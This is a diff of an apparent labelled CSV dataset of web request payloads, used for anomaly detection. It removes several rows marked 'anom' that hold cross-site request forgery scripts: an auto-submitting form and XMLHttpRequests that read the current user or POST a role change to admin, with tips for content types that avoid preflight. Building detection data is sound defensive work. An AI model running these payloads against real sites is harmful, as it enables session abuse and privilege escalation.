@@ -12,27 +12,3 @@ payload,label
 <script>
  document.getElementById(""autosubmit"").submit();
 </script>",anom
-,anom
-"<script>
-var xhr = new XMLHttpRequest();
-xhr.open(""GET"", ""http://www.example.com/api/currentuser"");
-xhr.send();
-</script>",anom
-"<script>
-var xhr = new XMLHttpRequest();
-xhr.open(""POST"", ""http://www.example.com/api/setrole"");
-//application/json is not allowed in a simple request. text/plain is the default
-xhr.setRequestHeader(""Content-Type"", ""text/plain"");
-//You will probably want to also try one or both of these
-//xhr.setRequestHeader(""Content-Type"", ""application/x-www-form-urlencoded"");
-//xhr.setRequestHeader(""Content-Type"", ""multipart/form-data"");
-xhr.send('{""role"":admin}');
-</script>",anom
-,anom
-"<script>
-var xhr = new XMLHttpRequest();
-xhr.open(""POST"", ""http://www.example.com/api/setrole"");
-xhr.withCredentials = true;
-xhr.setRequestHeader(""Content-Type"", ""application/json;charset=UTF-8"");
-xhr.send('{""role"":admin}');
-</script>",anom
